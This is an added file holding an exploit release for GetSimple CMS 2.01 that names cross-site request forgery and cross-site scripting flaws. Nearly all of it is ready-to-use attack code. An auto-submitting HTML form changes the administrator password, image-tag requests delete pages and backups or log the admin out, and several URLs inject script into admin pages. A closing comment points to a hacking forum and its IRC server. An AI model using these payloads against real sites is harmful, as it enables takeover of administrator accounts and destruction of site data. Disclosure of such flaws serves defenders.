@@ -1,0 +1,61 @@
+<!---
+    Title: GetSimple CMS 2.01 Multiple Vulnerabilities (XSS/CSRF)
+    Author: 10n1z3d <10n1z3d[at]w[dot]cn>
+    Date: Mon 12 Jul 2010 12:11:45 PM EEST 
+    Vendor: http://get-simple.info/
+    Download: http://www.box.net/get-simple
+--->
+
+-=[ CSRF PoC 1 - Change Admin Password ]=-
+
+    <html>
+        <head>
+            <title>GetSimple CMS 2.01 Multiple Vulnerabilities (XSS/CSRF) - Change Admin Password</title>
+        </head>
+        <body onload="document.csrf.submit();">
+                
+            <form name="csrf" action="http://[domain]/admin/settings.php" method="post">
+                <!--- Edit these --->
+                <input type="hidden" name="user" value="admin" />
+                <input type="hidden" name="email" value="root@root.com" />
+                <input type="hidden" name="sitepwd" value="rootroot"/>
+                <input type="hidden" name="sitepwd_confirm" value="rootroot"/>
+                <!--- Do not edit below --->
+                <input type="hidden" name="submitted" value="Save Settings" />
+            </form>
+        </body>
+    </html>
+    
+-=[ CSRF PoC 2 - Delete Page ]=-
+
+    <img src="http://[domain]/admin/deletefile.php?id=about" alt="Do you see this?" />
+
+-=[ CSRF PoC 3 - Delete All Backups ]=-
+
+    <img src="http://[domain]/admin/backups.php?deleteall" alt="Do you see this?" />
+
+-=[ CSRF PoC 4 - Logout The Administrator ]=-
+
+    <img src="http://[domain]/admin/logout.php" alt="Do you see this?" />
+
+-=[ XSS PoCs ]=-
+
+    http://[domain]/admin/support.php?success=<script>alert('xss');</script>
+    http://[domain]/admin/archive.php?upd=del-success&id=<script>alert('xss');</script>
+    http://[domain]/admin/upload.php?upd=del-success&id=<script>alert('xss');</script>
+    http://[domain]/admin/pages.php?error=<script>alert('xss');</script>
+    http://[domain]/admin/pages.php?upd=edit-success&id=<script>alert('xss');</script>&type=delete
+    http://[domain]/admin/pages.php?upd=edit-err&type=<script>alert('xss');</script>
+
+-=[ Note ]=-
+
+    More vulnerabilities exist in this version please see the following links:
+    
+    http://secunia.com/advisories/39464
+    http://secunia.com/advisories/39720
+
+<!---
+    http://www.evilzone.org/
+    irc.evilzone.org  (6697 / 9999)
+--->
+
